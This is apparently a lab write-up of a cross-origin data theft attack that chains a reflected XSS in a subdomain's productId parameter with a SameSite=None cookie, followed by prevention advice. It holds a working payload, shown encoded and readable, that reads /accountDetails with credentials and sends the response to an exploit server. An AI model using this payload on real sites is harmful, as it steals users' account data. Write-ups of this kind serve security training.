Vulnerability(s):
	- Insecure SameSite Attribute Configuration:
		The SameSite cookie attribute in the subdomain's response is set to "None", Allowing an attacker to send cross-origin requests with cookies included.
		
	- Reflected Cross-Site Scripting (XSS):
		The subdomain stock.server.net does not properly validate input parameters, Allowing injection of JavaScript via the productId parameter.
	
Exploit:
	Encoded Payload:
		<script>
			document.location = "http://[SUBDOMAIN].[SERVER].net/?productId=4%3Cscript%3Evar%20req%3Dnew%20XMLHttpRequest()%3Breq.onload%3Dfunction()%7Blocation%3D'https%3A%2F%2F[EXPLOIT].net%2Flog%3Fkey%3D'%2Bthis.responseText%7D%3Breq.open('get'%2C'https%3A%2F%2F[SERVER].net%2FaccountDetails'%2Ctrue)%3Breq.withCredentials%3Dtrue%3Breq.send()%3C%2Fscript%3E&storeId=1";
		</script>
	
	More Readable:
		<script>
			document.location = "http://[SUBDOMAIN].[SERVER].net/?productId=4<script>
				var req = new XMLHttpRequest();
				req.onload = function() {
					location = 'https://[EXPLOIT].net/log?key=' + this.responseText;
				};
				req.open('get', 'https://[SERVER].net/accountDetails', true);
				req.withCredentials = true;
				req.send();
			</script>&storeId=1";
		</script>
	
Explanation:
	- Generate a JS code in your exploit server that will redirect to the 'stock.server.net/' subdomain.
	- Observer that the GET request of this site is expecting two parameters "productId" and "storeId".
	- The "productId" parameter is vulnerable to reflected XSS because the value is not sanitized in the server side (Even by entring a value that causes an error the script will be executed).
	- Via this site you can bypass the SOP&CORS mechanisem because the data could be read between requests under the same domain due to the attribute "SameSite" that has been set to "none".
	- Capture the response and make a request to your exploit server including the body of the respones as a part of the URL.
	
Prevention:
	- Change the cookie attribute "SameSite" to "strict" or "lex".
	- Properly validate and sanitize the "productId" parameter, restricting it to numeric values only.
